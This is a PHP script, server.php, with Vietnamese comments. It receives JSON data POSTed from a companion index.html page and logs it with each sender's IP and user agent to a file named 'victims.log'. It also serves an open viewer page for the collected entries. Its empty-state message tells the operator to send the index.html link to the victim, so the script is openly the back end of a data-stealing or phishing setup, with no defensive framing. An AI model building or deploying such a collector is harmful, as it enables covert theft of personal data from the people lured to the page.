<?php
// server.php - Nhận, lưu và hiển thị dữ liệu (tích hợp viewer)
$log_file = 'victims.log';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');

// Xử lý POST từ index.html
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['data'])) {
    $raw_data = $_POST['data'];
    $decoded = json_decode($raw_data, true);
    
    $entry = "[$time] IP: $ip | UA: $user_agent\n";
    $entry .= "DATA: " . print_r($decoded, true) . "\n";
    $entry .= str_repeat('-', 80) . "\n";
    
    file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);
    
    http_response_code(200);
    echo 'OK';
    exit;
}

// Nếu không có POST -> hiển thị viewer (xem log)
if (file_exists($log_file)) {
    $content = file_get_contents($log_file);
    // Định dạng hiển thị đẹp hơn
    $content = nl2br(htmlspecialchars($content));
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Viewer - Dữ liệu thu thập</title>";
    echo "<style>body{background:#1e1e1e;color:#d4d4d4;font-family:Consolas,monospace;padding:20px;white-space:pre-wrap;word-wrap:break-word;}";
    echo ".entry{border-bottom:1px solid #444;padding:10px 0;}</style></head><body>";
    echo "<h2>📊 Dữ liệu đã thu thập (" . count(file($log_file)) . " dòng)</h2>";
    echo "<div class='entry'>" . $content . "</div>";
    echo "</body></html>";
} else {
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Viewer</title></head><body>";
    echo "<h2>Chưa có dữ liệu. Hãy gửi link index.html cho nạn nhân.</h2>";
    echo "</body></html>";
}
?>